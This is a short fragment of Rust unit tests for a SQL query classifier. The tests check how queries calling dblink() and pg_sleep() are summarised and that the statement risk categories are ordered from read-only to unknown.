        let c = classify("select * from dblink('x', 'y') as t(a text)");
        assert_eq!(c.summary, "1 statement: SELECT calling dblink()");
        assert!(c.parse_ok);
        let c = classify("select 1; select pg_sleep(5)");
        assert_eq!(c.statements, vec![ReadOnly, Unknown]);
        assert_eq!(c.summary, "2 statements: SELECT, SELECT calling pg_sleep()");
    }

    #[test]
    fn ordering_is_by_danger() {
        assert!(ReadOnly < Session && Session < Write && Write < Ddl && Ddl < Unknown);
    }
}
